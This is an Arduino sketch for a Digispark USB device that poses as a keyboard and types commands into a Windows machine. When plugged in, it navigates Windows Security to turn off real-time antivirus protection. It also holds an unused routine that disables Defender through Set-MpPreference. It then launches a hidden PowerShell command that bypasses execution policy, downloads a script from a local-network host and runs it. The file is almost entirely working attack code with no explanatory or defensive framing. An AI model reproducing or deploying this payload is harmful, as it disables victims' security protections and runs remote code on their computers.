#include "DigiKeyboard.h"

#define KEY_UP_ARROW   0x52
#define KEY_DOWN_ARROW   0x51
#define KEY_LEFT_ARROW   0x50
#define KEY_RIGHT_ARROW   0x4F
#define KEY_LEFT_GUI   0xE3
#define KEY_ESC   0x29
#define KEY_TAB   0x2B


void digiBegin() {
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(0);
}

void digiEnd() {
  const int led=1;
  pinMode(led, OUTPUT);
  while (1) {
    digitalWrite(led, !digitalRead(led));
    DigiKeyboard.delay(1000);
  }
}

void startCmd() {
  DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
  DigiKeyboard.delay(250);
  DigiKeyboard.print("cmd Start-Process powershell -Verb runAs");
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000); 
}

void disableAV() {
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);  
  DigiKeyboard.print("Set-MpPreference -DisableIOAVProtection $true");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("Set-MpPreference -DisableRealtimeMonitoring $true");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
}

void disableAV_TAB() {
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_Q, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("virus & threat protection");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_SPACE);
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_Y,MOD_ALT_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);
  DigiKeyboard.delay(500);
  
}

void executePayload() {
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell -ExecutionPolicy Bypass -NoLogo -NoProfile -WindowStyle Hidden (New-Object system.net.webclient).downloadstring('http://192.168.1.102/download_cradle.ps1') | IEX");
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(300);
}

/* ------------- main ------------- */

void setup() {
  digiBegin();
  
  disableAV_TAB();

  executePayload();
  
  digiEnd();
}

void loop() {
}
